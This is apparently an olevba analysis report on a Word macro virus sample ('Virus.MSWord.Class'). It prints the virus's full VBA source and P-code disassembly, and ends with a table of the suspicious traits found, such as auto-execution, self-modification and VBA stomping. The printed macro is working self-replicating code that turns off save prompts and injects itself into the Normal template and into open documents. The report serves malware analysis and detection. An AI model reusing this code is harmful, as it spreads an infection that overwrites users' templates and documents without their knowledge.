olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.el
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.el - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
If Year(Now) = 2001 Then MsgBox "Welcome to the 21st Century", 0, "The True Begining"
name1 = "c:\windows\temp\" & Application.UserName & ".tmp"
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
ActDoc = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
NormTemp = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If NormTemp = 79 Then GoTo out1
If NormTemp <> 79 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
        With host.codemodule
        For Countloop1 = 1 To 1000
        On Error GoTo Done1
        .deletelines 1
        Next Countloop1
Done1:
        End With
Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
    ActiveDocument.VBProject.VBComponents.Item(1).Export name1
    host.codemodule.AddFromFile (name1)
    With host.codemodule
    For Countloop2 = 1 To 4
    .deletelines 1
    Next Countloop2
    .replaceline 1, "Sub AutoClose()"
    .replaceline 34, "host.codemodule.AddFromFile (" & Chr(34) & name1 & Chr(34) & ")"
     End With
  
End If
out1:
If ActDoc <> 79 Then
Set host = ActiveDocument.VBProject.VBComponents.Item(1)
host.codemodule.AddFromFile ("c:\windows\temp\Andreas Marx.tmp")
With host.codemodule
    For Countloop3 = 1 To 4
    .deletelines 1
    Next Countloop3
    
End With
End If
End Sub
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.el
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8635 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D1 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Welcome to the 21st Century"
' 	LitDI2 0x0000 
' 	LitStr 0x0011 "The True Begining"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #2:
' 	LitStr 0x0010 "c:\windows\temp\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0004 ".tmp"
' 	Concat 
' 	St name1 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ActDoc 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St NormTemp 
' Line #7:
' 	Ld NormTemp 
' 	LitDI2 0x004F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo out1 
' 	EndIf 
' Line #8:
' 	Ld NormTemp 
' 	LitDI2 0x004F 
' 	Ne 
' 	IfBlock 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #10:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #11:
' 	StartForVariable 
' 	Ld Countloop1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	For 
' Line #12:
' 	OnError Done1 
' Line #13:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #14:
' 	StartForVariable 
' 	Ld Countloop1 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	Label Done1 
' Line #16:
' 	EndWith 
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #18:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #19:
' 	Ld name1 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #20:
' 	Ld name1 
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #21:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #22:
' 	StartForVariable 
' 	Ld Countloop2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #23:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #24:
' 	StartForVariable 
' 	Ld Countloop2 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #26:
' 	LitDI2 0x0022 
' 	LitStr 0x001D "host.codemodule.AddFromFile ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld name1 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #27:
' 	EndWith 
' Line #28:
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Label out1 
' Line #31:
' 	Ld ActDoc 
' 	LitDI2 0x004F 
' 	Ne 
' 	IfBlock 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #33:
' 	LitStr 0x0020 "c:\windows\temp\Andreas Marx.tmp"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #34:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #35:
' 	StartForVariable 
' 	Ld Countloop3 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #37:
' 	StartForVariable 
' 	Ld Countloop3 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' Line #39:
' 	EndWith 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndSub 
' Line #42:
' 	QuoteRem 0x0000 0x0000 ""
' Line #43:
' 	QuoteRem 0x0000 0x0000 ""
' Line #44:
' 	QuoteRem 0x0000 0x0000 ""
' Line #45:
' 	QuoteRem 0x0000 0x0000 ""
' Line #46:
' 	QuoteRem 0x0000 0x0000 ""
' Line #47:
' 	QuoteRem 0x0000 0x0000 ""
' Line #48:
' 	QuoteRem 0x0000 0x0000 ""
' Line #49:
' 	QuoteRem 0x0000 0x0000 ""
' Line #50:
' 	QuoteRem 0x0000 0x0000 ""
' Line #51:
' 	QuoteRem 0x0000 0x0000 ""
' Line #52:
' 	QuoteRem 0x0000 0x0000 ""
' Line #53:
' 	QuoteRem 0x0000 0x0000 ""
' Line #54:
' 	QuoteRem 0x0000 0x0000 ""
' Line #55:
' 	QuoteRem 0x0000 0x0000 ""
' Line #56:
' 	QuoteRem 0x0000 0x0000 ""
' Line #57:
' 	QuoteRem 0x0000 0x0000 ""
' Line #58:
' 	QuoteRem 0x0000 0x0000 ""
' Line #59:
' 	QuoteRem 0x0000 0x0000 ""
' Line #60:
' 	QuoteRem 0x0000 0x0000 ""
' Line #61:
' 	QuoteRem 0x0000 0x0000 ""
' Line #62:
' 	QuoteRem 0x0000 0x0000 ""
' Line #63:
' 	QuoteRem 0x0000 0x0000 ""
' Line #64:
' 	QuoteRem 0x0000 0x0000 ""
' Line #65:
' 	QuoteRem 0x0000 0x0000 ""
' Line #66:
' 	QuoteRem 0x0000 0x0000 ""
' Line #67:
' 	QuoteRem 0x0000 0x0000 ""
' Line #68:
' 	QuoteRem 0x0000 0x0000 ""
' Line #69:
' 	QuoteRem 0x0000 0x0000 ""
' Line #70:
' 	QuoteRem 0x0000 0x0000 ""
' Line #71:
' 	QuoteRem 0x0000 0x0000 ""
' Line #72:
' 	QuoteRem 0x0000 0x0000 ""
' Line #73:
' 	QuoteRem 0x0000 0x0000 ""
' Line #74:
' 	QuoteRem 0x0000 0x0000 ""
' Line #75:
' 	QuoteRem 0x0000 0x0000 ""
' Line #76:
' 	QuoteRem 0x0000 0x0000 ""
' Line #77:
' 	QuoteRem 0x0000 0x0000 ""
' Line #78:
' 	QuoteRem 0x0000 0x0000 ""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

